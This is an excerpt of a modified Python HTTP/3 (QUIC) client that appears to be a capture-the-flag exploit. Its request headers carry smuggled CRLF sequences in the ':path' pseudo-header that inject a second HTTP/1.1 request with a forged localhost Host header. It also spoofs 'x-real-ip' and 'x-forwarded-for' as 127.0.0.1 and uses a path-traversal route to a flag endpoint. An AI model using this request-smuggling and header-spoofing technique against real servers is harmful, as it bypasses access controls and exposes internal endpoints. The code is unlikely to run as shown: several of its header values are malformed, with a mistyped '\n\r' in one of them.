...
class HttpClient(QuicConnectionProtocol):
    ...
    async def websocket(
        ...
        headers = [
            ...
            (b":path", f"{request.url.full_path} HTTP/1.0\n\rHost: 127.0.0.1".encode()),
            (b":protocol", b"websocket"),
            (b"user-agent", USER_AGENT.encode()),
            (b"sec-websocket-version", b"13"),
            (b"x-real-ip", "127.0.0.1".encode()),
            (b"x-forwarded-for", "127.0.0.1".encode())
        ]
        if subprotocols:
            headers.append(
    ...
    async def _request(self, request: HttpRequest) -> Deque[H3Event]:
        ...
        self._http.send_headers(
            ...
            headers=[
                ...
                (b":authority", request.url.authority.encode()),
                (b":path", f"/aaa/flag/../../get/Flag HTTP/1.1\r\nhost: 127.0.0.1:8080\r\nx-real-ip: 127.0.0.1\r\n\r\nwow:".encode()),
                (b"user-agent", "woohoo".encode())
            ]
